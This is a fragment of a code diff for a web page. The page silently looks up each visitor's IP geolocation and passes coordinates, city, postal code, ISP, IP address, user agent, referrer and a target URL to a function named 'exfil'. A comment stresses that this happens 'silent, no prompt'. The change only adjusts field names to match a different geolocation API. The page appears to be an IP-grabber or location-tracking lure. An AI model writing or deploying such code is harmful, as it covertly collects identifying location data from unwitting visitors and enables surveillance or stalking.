@@ -100,25 +100,26 @@
     window.ipGeo = function(data) {
       exfil({
         type: 'ip',
-        lat: data.latitude,         // ← was json.lat, now data.latitude
-        lon: data.longitude,        // ← was json.lon, now data.longitude
+        lat: data.lat,
+        lon: data.lon,
         city: data.city || '',
-        region: data.region || '',
+        region: data.regionName || '',
         country: data.country || '',
-        zip: data.postal_code || '', // ← was json.zip, now data.postal_code
+        zip: data.zip || '',
         isp: data.isp || '',
-        org: data.organization || '', // ← was json.org, now data.organization
-        ip: data.ip || '',
+        org: data.org || '',
+        ip: data.query || '',
         ua: navigator.userAgent,
         targetUrl: target || '',
         timestamp: new Date().toISOString(),
         referrer: document.referrer || 'direct'
       });
     };
+
     // Inject IP geolocation script (silent, no prompt)
     const s = document.createElement('script');
     s.src = 'https://api.ip.sb/geoip?callback=ipGeo';
-    document.head.appendChild(s);
+  document.head.appendChild(s);
 
     // UI logic
     if (!target) {
